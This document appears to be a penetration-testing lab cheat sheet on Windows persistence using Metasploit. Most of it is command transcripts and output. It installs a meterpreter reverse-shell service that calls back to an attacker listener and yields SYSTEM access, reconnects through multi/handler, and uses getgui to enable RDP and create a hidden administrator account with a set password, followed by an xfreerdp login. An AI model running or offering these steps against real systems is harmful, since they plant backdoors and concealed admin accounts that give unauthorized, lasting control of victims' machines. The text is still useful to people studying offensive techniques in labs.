# Windows Persistence

## Service

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > use exploit/windows/local/persistence_service
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/persistence_service) > options

Module options (exploit/windows/local/persistence_service):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   REMOTE_EXE_NAME                       no        The remote victim name. Random string as default.
   REMOTE_EXE_PATH                       no        The remote victim exe path to run. Use temp directory as default.
   RETRY_TIME           5                no        The retry time that shell connect failed. 5 seconds as default.
   SERVICE_DESCRIPTION                   no        The description of service. Random string as default.
   SERVICE_NAME                          no        The name of service. Random string as default.
   SESSION                               yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.23.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/local/persistence_service) > setg SESSION 1
SESSION => 1

msf6 exploit(windows/local/persistence_service) > set LPORT 4433
LPORT => 4433

msf6 exploit(windows/local/persistence_service) > run

[*] Started reverse TCP handler on 10.10.23.2:4433 
[*] Running module against WIN-OMCNBKR66MN
[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\1\itBfP.exe
[*] Creating service gQvq
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/WIN-OMCNBKR66MN_20240408.4642/WIN-OMCNBKR66MN_20240408.4642.rc
[*] Sending stage (175174 bytes) to 10.4.27.206
[*] Meterpreter session 2 opened (10.10.23.2:4433 -> 10.4.27.206:49269) at 2024-04-08 16:46:42 +0530

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

The exe and service needs to be deleted after the engagment.


```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST eth1
LHOST => 10.10.23.2
msf6 exploit(multi/handler) > set LPORT 4433
LPORT => 4433
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.23.2:4433 
[*] Sending stage (175174 bytes) to 10.4.27.206
[*] Meterpreter session 3 opened (10.10.23.2:4433 -> 10.4.27.206:49291) at 2024-04-08 16:50:10 +0530

meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

## RDP

Enable RDP, create user, hide user from login page, make the user admin
All in one command

```bash
meterpreter > run getgui -e -u eric -p hacker_123321 

[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Enabling Remote Desktop
[*] 	RDP is disabled; enabling it ...
[*] Setting Terminal Services service startup mode
[*] 	The Terminal Services service is not set to auto, changing it to auto ...
[*] 	Opening port in local firewall if necessary
[*] Setting user account for logon
[*] 	Adding User: eric with Password: hacker_123321
[*] 	Hiding user from Windows Login screen
[*] 	Adding User: eric to local group 'Remote Desktop Users'
[*] 	Adding User: eric to local group 'Administrators'
[*] You can now login with the created user
[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20240408.5941.rc
```

```bash
root@attackdefense:~# xfreerdp /u:eric /p:hacker_123321 /v:10.4.28.58
```